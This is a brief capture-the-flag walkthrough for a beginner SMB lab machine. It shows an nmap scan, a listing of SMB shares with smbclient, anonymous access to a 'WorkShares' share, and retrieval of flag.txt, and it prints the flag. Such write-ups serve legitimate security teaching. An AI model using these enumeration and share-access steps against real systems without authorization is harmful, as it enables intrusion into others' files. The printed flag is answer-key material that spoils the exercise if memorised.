# CTF Walkthrough: Dancing

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Steps](#2-steps)

---

## 1. Introduction

**Category:** [Server Message Block (SMB)]  
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Steps

1. Service Enumeration
    Command: `nmap -sV 10.129.45.129`
        - Output:
            ```
            PORT     STATE SERVICE       VERSION
            135/tcp  open  msrpc         Microsoft Windows RPC
            139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
            445/tcp  open  microsoft-ds?
            5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
            |_http-server-header: Microsoft-HTTPAPI/2.0
            |_http-title: Not Found
            Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

            ```
2. List all shares in SMB
    - Command: `smbclient -L 10.129.45.129`
        - Output:
            ```
            Sharename       Type      Comment
            ---------       ----      -------
            ADMIN$          Disk      Remote Admin
            C$              Disk      Default share
            IPC$            IPC       Remote IPC
            WorkShares      Disk
            ```

3. Go to WorkShares
    - Command: `smbclient \\\\10.129.45.129\\WorkShares`

4. Get Flag
    - Command: 
        ```
        cd James.P
        get flag.txt
        ```
    - Flag : 5f61c10dffbc77a704d76016a22f1664


